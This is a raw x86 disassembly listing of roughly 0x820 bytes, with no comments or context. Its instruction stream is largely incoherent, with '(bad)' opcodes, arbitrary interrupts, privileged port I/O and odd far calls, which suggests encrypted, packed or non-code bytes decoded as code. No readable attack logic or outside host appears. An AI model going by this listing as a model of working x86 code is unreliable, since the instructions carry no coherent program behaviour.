  42499d:	or     dh,BYTE PTR [esi-0x63]
  4249a0:	jl     0x4249a8
  4249a2:	icebp  
  4249a3:	aam    0x89
  4249a5:	clc    
  4249a6:	icebp  
  4249a7:	sub    edx,edx
  4249a9:	xchg   DWORD PTR [esi-0x63],esi
  4249ac:	in     al,dx
  4249ad:	xchg   edx,eax
  4249ae:	int    0xd2
  4249b0:	jo     0x42497f
  4249b2:	outs   dx,BYTE PTR ds:[esi]
  4249b3:	test   BYTE PTR [edi+0x63bd70c5],al
  4249b9:	test   DWORD PTR [eax+0x1c76cd80],eax
  4249bf:	int    0x7c
  4249c1:	mov    BYTE PTR [edx],cl
  4249c3:	lea    ebx,[ebp-0x32027233]
  4249c9:	xchg   esi,eax
  4249ca:	std    
  4249cb:	cmp    ecx,DWORD PTR [edi]
  4249cd:	add    al,0xfb
  4249cf:	call   ebx
  4249d1:	jmp    0x424965
  4249d3:	shr    edx,cl
  4249d5:	sub    BYTE PTR [ebx+0x13],dl
  4249d8:	pop    esi
  4249d9:	lea    ebx,[ebp-0x7232e32c]
  4249df:	mov    BYTE PTR [edi-0x29ffb384],al
  4249e5:	popf   
  4249e6:	int    0x6c
  4249e8:	test   BYTE PTR [ecx-0x79],dh
  4249eb:	lds    esi,FWORD PTR [eax-0x43]
  4249ee:	add    eax,DWORD PTR [edi+0x76cd8080]
  4249f4:	sbb    al,0xcd
  4249f6:	(bad)  
  4249f7:	stc    
  4249f8:	int    0x96
  4249fa:	stc    
  4249fb:	cmp    ecx,DWORD PTR [edi]
  4249fd:	shr    ebx,cl
  4249ff:	xchg   edx,eax
  424a00:	add    al,0xfb
  424a02:	inc    DWORD PTR [ebp*2+0x28ead33c]
  424a09:	push   ebx
  424a0a:	adc    eax,DWORD PTR [ecx-0x69325a73]
  424a10:	and    al,0xa
  424a12:	jbe    0x424a30
  424a14:	int    0x76
  424a16:	stc    
  424a17:	int    0x8d
  424a19:	stc    
  424a1a:	add    al,0x2
  424a1c:	(bad)  
  424a1d:	cmp    edi,DWORD PTR [ecx-0x2d]
  424a20:	repnz sub bl,dl
  424a23:	mov    ebp,0xcdd35392
  424a28:	lea    esp,[edi+ebp*1]
  424a2b:	mov    ebx,0x7d33867e
  424a30:	pop    esi
  424a31:	lea    esp,[ebp+0xa4072f]
  424a37:	add    BYTE PTR [eax],al
  424a39:	int    0x8
  424a3b:	and    eax,0x43808081
  424a40:	sbb    al,0xd6
  424a42:	cmp    ecx,ebp
  424a44:	lea    edx,[ecx]
  424a46:	int    0x8
  424a48:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a4e:	lods   eax,DWORD PTR ds:[esi]
  424a4f:	(bad)  
  424a50:	int    0x96
  424a52:	adc    DWORD PTR [ebx],edi
  424a54:	(bad)  
  424a56:	sti    
  424a57:	call   ebx
  424a59:	jmp    0x4249ed
  424a5b:	shr    edx,cl
  424a5d:	sub    BYTE PTR [ebx-0x1d],dl
  424a60:	int    0x8d
  424a62:	dec    esp
  424a63:	bound  eax,QWORD PTR [eax]
  424a65:	xchg   ecx,eax
  424a66:	xchg   esp,eax
  424a67:	pop    ebx
  424a68:	add    BYTE PTR [eax+0x24],dh
  424a6b:	push   es
  424a6c:	ins    DWORD PTR es:[edi],dx
  424a6d:	das    
  424a6e:	add    eax,0x808092d9
  424a73:	int    0x96
  424a75:	and    al,0xcd
  424a77:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424a7d:	or     ch,0x7d
  424a80:	cmp    ecx,DWORD PTR [edi]
  424a82:	add    al,0x11
  424a84:	call   ebx
  424a86:	jmp    0x424a1a
  424a88:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424a8e:	add    eax,0x808081da
  424a93:	int    0x76
  424a95:	std    
  424a96:	int    0x8d
  424a98:	std    
  424a99:	cmp    edi,DWORD PTR [ecx+0x4]
  424a9c:	add    bh,bh
  424a9e:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424aa4:	push   ebx
  424aa5:	ror    DWORD PTR [edx],cl
  424aa7:	jbe    0x424a66
  424aa9:	pop    ebp
  424aaa:	push   0xcf35869f
  424aaf:	jl     0x424a5e
  424ab1:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424ab7:	leave  
  424ab8:	jbe    0x424aff
  424aba:	sbb    BYTE PTR [edi+0x76c93586],bl
  424ac0:	shr    al,1
  424ac2:	lahf   
  424ac3:	xchg   BYTE PTR ds:0xc955760a,dh
  424ac9:	jbe    0x424b38
  424acb:	dec    ecx
  424acc:	and    DWORD PTR [esi-0x3234c4cb],eax
  424ad2:	xchg   esp,eax
  424ad3:	iret   
  424ad4:	inc    ebp
  424ad5:	shl    ebx,cl
  424ad7:	xchg   edx,eax
  424ad8:	adc    bh,bl
  424ada:	scas   eax,DWORD PTR es:[edi]
  424adb:	cmp    DWORD PTR [eax+0x150ab880],eax
  424ae1:	lea    esi,[eax+eax*1+0x0]
  424ae5:	add    BYTE PTR [esi+0x4],ch
  424ae8:	cli    
  424ae9:	xchg   BYTE PTR [edx-0x6047a019],al
  424aef:	xchg   BYTE PTR ds:0x94060a,dh
  424af5:	add    BYTE PTR [eax],al
  424af7:	or     al,BYTE PTR [esi]
  424af9:	mov    esp,0xa000000
  424afe:	jbe    0x424ab0
  424b00:	or     dh,BYTE PTR [esi+0x15]
  424b03:	iret   
  424b04:	outs   dx,BYTE PTR ds:[esi]
  424b05:	std    
  424b06:	iret   
  424b07:	jno    0x424b79
  424b09:	or     dh,BYTE PTR [esi+0x2d]
  424b0c:	or     dh,BYTE PTR [esi+0x35]
  424b0f:	leave  
  424b10:	push   es
  424b11:	jo     0x424b13
  424b13:	add    BYTE PTR [eax],al
  424b15:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424b1b:	pushf  
  424b1c:	add    BYTE PTR [eax],al
  424b1e:	add    BYTE PTR [edx],cl
  424b20:	pop    ss
  424b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b22:	add    BYTE PTR [eax],al
  424b24:	add    cl,cl
  424b26:	push   es
  424b27:	lods   al,BYTE PTR ds:[esi]
  424b28:	add    BYTE PTR [eax],al
  424b2a:	add    BYTE PTR [edx-0x61],cl
  424b2d:	xchg   BYTE PTR ds:0xb406c9,dh
  424b33:	add    BYTE PTR [eax],al
  424b35:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b3b:	les    eax,FWORD PTR [eax]
  424b3d:	add    BYTE PTR [eax],al
  424b3f:	popa   
  424b40:	lahf   
  424b41:	xchg   BYTE PTR ds:0x9006c9,dh
  424b47:	add    BYTE PTR [eax],al
  424b49:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b4f:	aam    0x0
  424b51:	add    BYTE PTR [eax],al
  424b53:	call   0xa77d1f7
  424b58:	iret   
  424b59:	fadd   QWORD PTR [eax]
  424b5b:	add    BYTE PTR [eax],al
  424b5d:	leave  
  424b5e:	push   es
  424b5f:	in     al,0x0
  424b61:	add    BYTE PTR [eax],al
  424b63:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424b69:	add    ecx,ecx
  424b6b:	jbe    0x424b72
  424b6d:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424b73:	or     ecx,ecx
  424b75:	jbe    0x424b43
  424b77:	inc    ecx
  424b78:	lahf   
  424b79:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424b7f:	jbe    0x424ba6
  424b81:	pusha  
  424b82:	lahf   
  424b83:	xchg   BYTE PTR ds:0x493d76c9,dh
  424b89:	and    DWORD PTR [esi-0x3292c4cb],eax
  424b8f:	int3   
  424b90:	push   es
  424b91:	jo     0x424b93
  424b93:	add    BYTE PTR [eax],al
  424b95:	shr    ebx,cl
  424b97:	xchg   edx,eax
  424b98:	add    DWORD PTR [edx],eax
  424b9a:	scas   eax,DWORD PTR es:[edi]
  424b9b:	or     esp,ecx
  424b9d:	test   DWORD PTR [eax+eax*1+0x0],eax
  424ba1:	add    BYTE PTR [esp+eax*1-0x7],ch
  424ba5:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424bab:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424bb5:	add    BYTE PTR [eax-0x7c],dh
  424bb8:	int    0xb3
  424bba:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424bc0:	inc    esp
  424bc1:	add    BYTE PTR [eax],al
  424bc3:	add    BYTE PTR [edx+0x70],ah
  424bc6:	add    BYTE PTR [ecx-0x78],dh
  424bc9:	or     dh,BYTE PTR [esi+0x7d]
  424bcc:	iret   
  424bcd:	jbe    0x424b8c
  424bcf:	jo     0x424b9e
  424bd1:	or     BYTE PTR ds:0x808081,ah
  424bd7:	push   eax
  424bd8:	int    0x76
  424bda:	jge    0x424bdc
  424bdc:	icebp  
  424bdd:	int    0x76
  424bdf:	std    
  424be0:	int    0x8d
  424be2:	std    
  424be3:	cmp    edi,DWORD PTR [ecx+0x4]
  424be6:	add    bh,bh
  424be8:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424bee:	push   ebx
  424bef:	ror    DWORD PTR [edx],cl
  424bf1:	jbe    0x424c00
  424bf3:	int    0x8d
  424bf5:	std    
  424bf6:	int    0x76
  424bf8:	std    
  424bf9:	cmp    ecx,DWORD PTR [edi]
  424bfb:	add    al,0x11
  424bfd:	call   ebx
  424bff:	lods   eax,DWORD PTR ds:[esi]
  424c00:	sub    bl,dl
  424c02:	jmp    0x424b96
  424c04:	push   ebx
  424c05:	jge    0x424bd4
  424c07:	jbe    0x424bc6
  424c09:	inc    ebx
  424c0a:	rcl    esp,cl
  424c0c:	xchg   esi,eax
  424c0d:	or     dh,BYTE PTR [esi+0x75]
  424c10:	in     al,dx
  424c11:	das    
  424c12:	int    0x80
  424c14:	int    0x8d
  424c16:	jne    0x424c22
  424c18:	jbe    0x424bd7
  424c1a:	int    0x76
  424c1c:	mov    ebp,0x4dd4d343
  424c21:	int    0x70
  424c23:	sbb    al,0xcd
  424c25:	mov    bl,0x25
  424c27:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424c31:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424c3b:	int    0xb3
  424c3d:	sub    eax,0xcd808081
  424c42:	xchg   esi,eax
  424c43:	dec    esp
  424c44:	int    0x62
  424c46:	cmp    al,0x87
  424c48:	xor    DWORD PTR [edx],ecx
  424c4a:	jo     0x424c70
  424c4c:	int    0x76
  424c4e:	stc    
  424c4f:	int    0x8d
  424c51:	stc    
  424c52:	cmp    edi,DWORD PTR [ecx+0x4]
  424c55:	add    bh,bh
  424c57:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c5d:	push   ebx
  424c5e:	ror    DWORD PTR [edx],cl
  424c60:	jbe    0x424c6f
  424c62:	int    0x96
  424c64:	and    al,0x9a
  424c66:	pop    ebx
  424c67:	mov    ebp,0xf5e2
  424c6c:	push   es
  424c6d:	ins    DWORD PTR es:[edi],dx
  424c6e:	das    
  424c6f:	add    eax,0x80808099
  424c74:	add    dh,dl
  424c76:	and    al,0xcd
  424c78:	lock pop ebx
  424c7a:	mov    ebp,0xf52c
  424c7f:	push   es
  424c80:	ins    DWORD PTR es:[edi],dx
  424c81:	das    
  424c82:	add    eax,0x808080c5
  424c87:	int    0x76
  424c89:	and    al,0xcd
  424c8b:	lock int 0xd5
  424c8e:	mov    ebp,0xfbe7
  424c93:	push   es
  424c94:	ins    DWORD PTR es:[edi],dx
  424c95:	das    
  424c96:	add    eax,0x808080d1
  424c9b:	call   0x0:0xf90ebd5b
  424ca2:	push   es
  424ca3:	ins    DWORD PTR es:[edi],dx
  424ca4:	das    
  424ca5:	add    eax,0x8080802d
  424caa:	int    0x8
  424cac:	and    eax,0x43808081
  424cb1:	sbb    al,0xd6
  424cb3:	sbb    cl,ch
  424cb5:	or     BYTE PTR [ecx],dl
  424cb7:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424cc1:	int    0x8d
  424cc3:	dec    esp
  424cc4:	add    BYTE PTR [ecx+0x70005b94],dl
  424cca:	and    al,0xcd
  424ccc:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424cd2:	or     ch,0x7d
  424cd5:	cmp    ecx,DWORD PTR [edi]
  424cd7:	add    al,0x11
  424cd9:	call   ebx
  424cdb:	jmp    0x424c6f
  424cdd:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424ce3:	(bad)
  424ce7:	dec    ecx
  424ce8:	and    BYTE PTR [esi-0x778932cb],al
  424cee:	int    0x8d
  424cf0:	mov    ch,cl
  424cf2:	jbe    0x424d18
  424cf4:	shr    ebx,cl
  424cf6:	xchg   edx,eax
  424cf7:	adc    al,BYTE PTR [edx]
  424cf9:	scas   eax,DWORD PTR es:[edi]
  424cfa:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424d00:	sbb    ch,cl
  424d02:	ins    BYTE PTR es:[edi],dx
  424d03:	cmp    al,0xcd
  424d05:	lea    ebp,[edi+eax*4]
  424d08:	lds    ecx,FWORD PTR [edx]
  424d0a:	outs   dx,BYTE PTR ds:[esi]
  424d0b:	adc    al,0xcd
  424d0d:	jbe    0x424d3b
  424d0f:	leave  
  424d10:	add    BYTE PTR [edi-0x327f7f80],0x76
  424d17:	sub    al,0xa
  424d19:	pushf  
  424d1a:	test   ch,cl
  424d1c:	jbe    0x424d4e
  424d1e:	int    0x8d
  424d20:	sub    al,0xa
  424d22:	outs   dx,BYTE PTR ds:[esi]
  424d23:	mov    ch,cl
  424d25:	jbe    0x424d3b
  424d27:	int    0x8d
  424d29:	sub    al,0xa
  424d2b:	outs   dx,BYTE PTR ds:[esi]
  424d2c:	dec    esp
  424d2d:	in     al,dx
  424d2e:	adc    al,0xcd
  424d30:	jbe    0x424d56
  424d32:	int    0x6c
  424d34:	cmp    al,0xcd
  424d36:	lea    ebp,[edi+eax*4]
  424d39:	lds    ecx,FWORD PTR [edx]
  424d3b:	outs   dx,BYTE PTR ds:[esi]
  424d3c:	adc    al,0xcd
  424d3e:	jbe    0x424d6c
  424d40:	add    al,0x2c
  424d42:	or     cl,0x76
  424d45:	icebp  
  424d46:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424d50:	cmp    ebx,ebp
  424d52:	int    0xc5
  424d54:	arpl   sp,bp
  424d56:	xchg   edx,eax
  424d57:	cmp    ebp,DWORD PTR [ebp-0x56]
  424d5a:	test   al,0xcb
  424d5c:	shl    BYTE PTR [eax+eax*4],cl
  424d5f:	xchg   esi,eax
  424d60:	int    0xed
  424d62:	jno    0x424dd5
  424d64:	das    
  424d65:	mov    ebx,0x74cf146e
  424d6a:	mov    BYTE PTR [edi+ebp*1],bl
  424d6d:	mov    ebx,0x9a5b867e
  424d72:	leave  
  424d73:	jbe    0x424d72
  424d75:	dec    ecx
  424d76:	and    DWORD PTR [esi-0x672f5cb],eax
  424d7c:	push   es
  424d7d:	retf   
  424d7e:	aam    0xb4
  424d80:	popa   
  424d81:	shl    DWORD PTR [ecx],1
  424d83:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424d89:	out    0x88,al
  424d8b:	xchg   edx,edi
  424d8d:	pop    esi
  424d8e:	out    0x4c,al
  424d90:	or     BYTE PTR [ebp-0x33],0xdc
  424d94:	mov    BYTE PTR [edi-0x77197806],al
  424d9a:	pop    esi
  424d9b:	out    0x4c,al
  424d9d:	cmp    BYTE PTR [edx-0x33],0x8d
  424da1:	std    
  424da2:	int    0xe6
  424da4:	std    
  424da5:	cmp    edx,DWORD PTR [ebx]
  424da7:	add    al,0xf8
  424da9:	call   ebx
  424dab:	jmp    0xd41e1ad8
  424db0:	in     al,dx
  424db1:	xchg   edx,eax
  424db2:	push   ebx
  424db3:	cld    
  424db4:	add    al,0xf2
  424db6:	std    
  424db7:	add    al,0xd3
  424db9:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424dc0:	sub    BYTE PTR [ebx-0x6],dl
  424dc3:	adc    bh,al
  424dc5:	dec    ecx
  424dc6:	and    DWORD PTR [esi-0x2197ecb],eax
  424dcc:	int    0x8d
  424dce:	std    
  424dcf:	int    0xe6
  424dd1:	std    
  424dd2:	cmp    edx,DWORD PTR [ebx]
  424dd4:	add    al,0xf8
  424dd6:	call   ebx
  424dd8:	jmp    0x424d6c
  424dda:	shr    ecx,cl
  424ddc:	sub    BYTE PTR [ebx-0x10],dl
  424ddf:	inc    ebx
  424de0:	(bad)  
  424de1:	stc    
  424de2:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424de9:	ror    BYTE PTR [eax-0x12326980],cl
  424def:	add    al,0xed
  424df1:	push   eax
  424df2:	leave  
  424df3:	jbe    0x424d9a
  424df5:	mov    edx,0xc98080ac
  424dfa:	jbe    0x424db1
  424dfc:	xchg   eax,ecx
  424dfe:	add    BYTE PTR [eax-0x68528937],0x40
  424e05:	add    BYTE PTR [eax-0x51068937],0x30
  424e0c:	test   BYTE PTR [eax-0x4a028937],al
  424e12:	lods   al,BYTE PTR ds:[esi]
  424e13:	add    BYTE PTR [eax+0x69f176c9],0x53
  424e1a:	add    BYTE PTR [eax-0x76a8937],0x42
  424e21:	add    BYTE PTR [eax-0x78628937],0x80
  424e28:	add    BYTE PTR [eax-0x2c428937],0xb8
  424e2f:	add    BYTE PTR [eax-0x32128937],0x71
  424e36:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424e3d:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e44:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e4a:	(bad)  
  424e4b:	stc    
  424e4c:	cmp    ebx,edx
  424e4e:	clc    
  424e4f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424e55:	repnz popa 
  424e57:	and    al,BYTE PTR [eax-0x7a34ed80]
  424e5d:	mov    BYTE PTR [eax+0x42021280],0xa4
  424e64:	add    BYTE PTR [eax+0x3cded312],0x80
  424e6b:	or     cl,0x76
  424e6e:	cmc    
  424e6f:	icebp  
  424e70:	lea    eax,[eax-0x2893680]
  424e76:	jnp    0x424e4c
  424e78:	add    BYTE PTR [eax+0x18f976c9],0x30
  424e7f:	add    BYTE PTR [eax-0x32068933],0x96
  424e86:	std    
  424e87:	ss dec eax
  424e89:	pushf  
  424e8a:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424e91:	int    0xe3
  424e93:	push   esi
  424e94:	jp     0x424e95
  424e96:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424e9d:	int    0x76
  424e9f:	std    
  424ea0:	xchg   DWORD PTR [esi-0x78],esi
  424ea3:	int    0x96
  424ea5:	std    
  424ea6:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424eac:	xor    ch,cl
  424eae:	jbe    0x424ec1
  424eb0:	int    0x96
  424eb2:	in     eax,dx
  424eb3:	sbb    BYTE PTR ss:[edi-0x80],cl
  424eb7:	cmp    BYTE PTR [ebx],0xd2
  424eba:	int    0x96
  424ebc:	mov    ebp,0xe261d253
  424ec1:	fadd   DWORD PTR [eax-0x320ecc80]
  424ec7:	jbe    0x424e7e
  424ec9:	xchg   DWORD PTR [ebx],edx
  424ecb:	popa   
  424ecc:	fist   WORD PTR [eax+eax*4-0x80]
  424ed0:	xor    esi,ecx
  424ed2:	xchg   DWORD PTR [esi-0x5a893253],edx
  424ed8:	int    0xd6
  424eda:	xor    ch,cl
  424edc:	out    0x9d,al
  424ede:	adc    bh,bl
  424ee0:	mov    DWORD PTR [ecx-0x80],esi
  424ee3:	sub    BYTE PTR [ebx],0xf1
  424ee6:	int    0x76
  424ee8:	xchg   ebp,eax
  424ee9:	adc    bh,bl
  424eeb:	mov    dh,0x2c
  424eed:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424ef4:	clc    
  424ef5:	int    0x96
  424ef7:	icebp  
  424ef8:	push   esi
  424ef9:	out    0x1e,al
  424efb:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424f02:	icebp  
  424f03:	adc    dh,bl
  424f05:	pop    es
  424f06:	push   edx
  424f07:	add    BYTE PTR [eax+0x72f9943],0x63
  424f0e:	add    BYTE PTR [eax],al
  424f10:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424f16:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424f1d:	pop    ebx
  424f1e:	cwde   
  424f1f:	call   0x8043:0xd9ed76c9
  424f26:	or     cl,0x76
  424f29:	adc    DWORD PTR [edx+0x7e],esi
  424f2c:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424f33:	add    BYTE PTR [eax+0xbf976c9],0x71
  424f3a:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f41:	add    BYTE PTR [eax-0x275a8937],0x58
  424f48:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f4f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424f56:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424f5d:	add    BYTE PTR [eax-0x449a8937],0x6f
  424f64:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424f6b:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424f72:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424f79:	add    BYTE PTR [eax-0x44f28937],0x4d
  424f80:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424f87:	add    BYTE PTR [eax-0x32528933],0x8d
  424f8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f8f:	dec    ebp
  424f90:	bound  ebp,QWORD PTR [ebx]
  424f92:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424f99:	dec    ebp
  424f9a:	pop    ds
  424f9b:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424fa1:	pop    edi
  424fa2:	xchg   ecx,eax
  424fa3:	mov    bh,0x7e
  424fa5:	stc    
  424fa6:	xor    edi,DWORD PTR [ebp-0x33]
  424fa9:	jbe    0x424fa8
  424fab:	int    0x96
  424fad:	stc    
  424fae:	sub    edx,edx
  424fb0:	int    0x96
  424fb2:	cmc    
  424fb3:	dec    ebp
  424fb4:	inc    edi
  424fb5:	outs   dx,DWORD PTR ds:[esi]
  424fb6:	add    BYTE PTR [eax-0x69322dcd],0x11
  424fbd:	xor    edx,edx
  424fbf:	int    0x96
  424fc1:	in     eax,dx
  424fc2:	push   ebx
  424fc3:	sar    BYTE PTR [ebx],cl
  424fc5:	fisubr DWORD PTR [ecx-0x27]
  424fc8:	ret    
  424fc9:	add    BYTE PTR [eax],al
  424fcb:	clc    
  424fcc:	test   ebp,0x72c34c96
  424fd2:	push   ds
  424fd3:	add    BYTE PTR [eax+0x76cdf133],0xbd
  424fda:	int    0xd6
  424fdc:	mov    ch,0x33
  424fde:	leave  
  424fdf:	das    
  424fe0:	sar    DWORD PTR [ecx+0x69],1
  424fe3:	fisttp DWORD PTR [edx]
  424fe5:	xchg   ecx,eax
  424fe6:	mov    ebx,ebp
  424fe8:	popa   
  424fe9:	add    BYTE PTR [eax-0x6a893680],0x9b
  424ff0:	push   esp
  424ff1:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  424ff8:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  424fff:	add    BYTE PTR [eax-0x7e5a8937],0x80
  425006:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  42500d:	pop    ebp
  42500e:	call   0xcdf4:0xf880806f
  425015:	xchg   esi,eax
  425016:	lods   eax,DWORD PTR ds:[esi]
  425017:	int    0xa6
  425019:	mov    BYTE PTR [ebx-0x2e],dl
  42501c:	int    0x96
  42501e:	popf   
  42501f:	xor    edx,edx
  425021:	int    0x96
  425023:	xchg   ebp,eax
  425024:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425026:	push   eax
  425027:	add    BYTE PTR [eax-0x302d2ed1],0x5
  42502e:	mov    BYTE PTR [eax+0x2c],bl
  425031:	ret    0xafd
  425034:	jbe    0x424fcb
  425036:	int    0x76
  425038:	icebp  
  425039:	int    0x96
  42503b:	or     eax,0xf3f7f534
  425040:	int    0x96
  425042:	xchg   ebp,eax
  425043:	xor    al,0x23
  425045:	inc    esp
  425046:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42504a:	inc    esi
  42504b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  425052:	rol    esi,0x80
  425055:	add    BYTE PTR [edi-0x59328a8a],0x6d
  42505c:	cmp    ebx,edx
  42505e:	clc    
  42505f:	hlt    
  425060:	int    0x96
  425062:	gs mov edi,0xc3d9
  425068:	ss aaa 
  42506a:	push   esi
  42506b:	add    BYTE PTR [eax+0xc56d233],0x6d
  425072:	add    BYTE PTR [eax],al
  425074:	xchg   DWORD PTR [ebp-0x33],edi
  425077:	jbe    0x425076
  425079:	int    0x96
  42507b:	stc    
  42507c:	sub    edx,edx
  42507e:	int    0x96
  425080:	cmc    
  425081:	dec    ebp
  425082:	inc    edi
  425083:	outs   dx,DWORD PTR ds:[esi]
  425084:	add    BYTE PTR [eax-0x69322dcd],0x11
  42508b:	xor    edx,edx
  42508d:	int    0x96
  42508f:	in     eax,dx
  425090:	push   ebx
  425091:	sar    BYTE PTR [ebx],cl
  425093:	(bad)  
  425095:	hlt    
  425096:	int    0x96
  425098:	dec    esp
  425099:	xor    esi,ecx
  42509b:	int    0x76
  42509d:	mov    ebp,0x33b5a6cd
  4250a2:	leave  
  4250a3:	das    
  4250a4:	rol    ebp,1
  4250a6:	int    0xdb
  4250a8:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  4250ae:	das    
  4250af:	pop    es
  4250b0:	pop    esp
  4250b1:	add    BYTE PTR [eax],al
  4250b3:	add    BYTE PTR [edx-0x2d349c58],ch
  4250b9:	mov    BYTE PTR [eax+0x4edcd96],al
  4250bf:	in     eax,dx
  4250c0:	jo     0x42508b
  4250c2:	jbe    0x425094
  4250c4:	xchg   ecx,eax
  4250c5:	aaa    
  4250c6:	ficom  WORD PTR [ebx]
  4250c8:	pop    ebp
  4250c9:	mov    ebp,0xa25230a
  4250ce:	jbe    0x425125
  4250d0:	leave  
  4250d1:	jbe    0x425130
  4250d3:	mov    esi,0xa13de37
  4250d8:	jbe    0x42513f
  4250da:	leave  
  4250db:	jbe    0x42514a
  4250dd:	fidiv  WORD PTR [edi]
  4250df:	ficom  WORD PTR [ebx]
  4250e1:	or     dh,BYTE PTR [esi+0x75]
  4250e4:	pop    ebx
  4250e5:	leave  
  4250e6:	jbe    0x425165
  4250e8:	scas   al,BYTE PTR es:[edi]
  4250e9:	aaa    
  4250ea:	ficom  WORD PTR [ebx]
  4250ec:	or     dh,BYTE PTR [esi+0xd]
  4250ef:	cwde   
  4250f0:	call   0xde37:0x96f176c9
  4250f7:	adc    ecx,DWORD PTR [edx]
  4250f9:	jbe    0x425090
  4250fb:	cmp    ebx,edx
  4250fd:	cmp    eax,DWORD PTR [eax]
  4250ff:	pop    edi
  425100:	dec    ecx
  425101:	and    DWORD PTR [esi-0x628936cb],eax
  425107:	out    0x37,al
  425109:	ficom  WORD PTR [ebx]
  42510b:	jp     0x425117
  42510d:	jbe    0x4250b4
  42510f:	int    0xd3
  425111:	or     dl,BYTE PTR [esi-0x4a19f513]
  425117:	iret   
  425118:	xchg   ecx,eax
  425119:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  425120:	push   ebx
  425121:	ror    bh,cl
  425123:	je     0x4250ec
  425125:	ror    ch,1
  425127:	xor    ch,cl
  425129:	pushf  
  42512a:	test   BYTE PTR [edi],ch
  42512c:	inc    ebp
  42512d:	loop   0x4250c1
  42512f:	shr    esp,cl
  425131:	xchg   edx,eax
  425132:	int    0x1c
  425134:	int    0x6c
  425136:	test   BYTE PTR [ebx],bh
  425138:	ins    DWORD PTR es:[edi],dx
  425139:	adc    bh,bl
  42513b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42513c:	mov    esi,0xf1534229
  425141:	or     dl,BYTE PTR [esi-0x6893207]
  425147:	xchg   DWORD PTR [ebp-0x2d],ebp
  42514a:	in     eax,0x28
  42514c:	inc    ebx
  42514d:	jbe    0x42519b
  42514f:	das    
  425150:	or     BYTE PTR [edi-0x327f7f80],bh
  425156:	jbe    0x425151
  425158:	add    al,0xb6
  42515a:	mov    ebp,0x11e60a80
  42515f:	int    0x76
  425161:	stc    
  425162:	push   es
  425163:	ins    DWORD PTR es:[edi],dx
  425164:	aam    0xb6
  425166:	cmp    ebp,DWORD PTR [ebp+0xa]
  425169:	out    0xf5,al
  42516b:	int    0x96
  42516d:	mov    ebp,0xcf88a6cd
  425172:	fs xor ch,cl
  425175:	xchg   esi,eax
  425176:	mov    BYTE PTR [edi-0x5269f527],al
  42517c:	retf   0x922
  42517f:	xchg   esi,eax
  425180:	add    ch,cl
  425182:	xchg   esi,eax
  425183:	stc    
  425184:	xchg   ecx,ebx
  425186:	retf   0x2014
  425189:	int    0xa6
  42518b:	lods   eax,DWORD PTR ds:[esi]
  42518c:	or     DWORD PTR [ebx],ebx
  42518e:	retf   0x96
  425191:	int    0xa6
  425193:	stc    
  425194:	xchg   ecx,esp
  425196:	int    0xe6
  425198:	mov    BYTE PTR [ecx],cl
  42519a:	adc    al,0x43
  42519c:	int    0x96
  42519e:	cmc    
  42519f:	ins    BYTE PTR es:[edi],dx
  4251a0:	add    al,0xea
  4251a2:	std    
  4251a3:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  4251a9:	push   ebx
  4251aa:	sar    BYTE PTR [ebx],cl
  4251ac:	ror    DWORD PTR [edx],cl
  4251ae:	jbe    0x4251a5
  4251b0:	push   ecx
  4251b1:	(bad)  
  4251b2:	cmc    
  4251b3:	int    0x96
  4251b5:	cmc    
  4251b6:	add    al,0x11
  4251b8:	call   ebx
  4251ba:	repz xchg edx,eax
  4251bc:	shr    DWORD PTR [ebp-0x322dacd8],cl
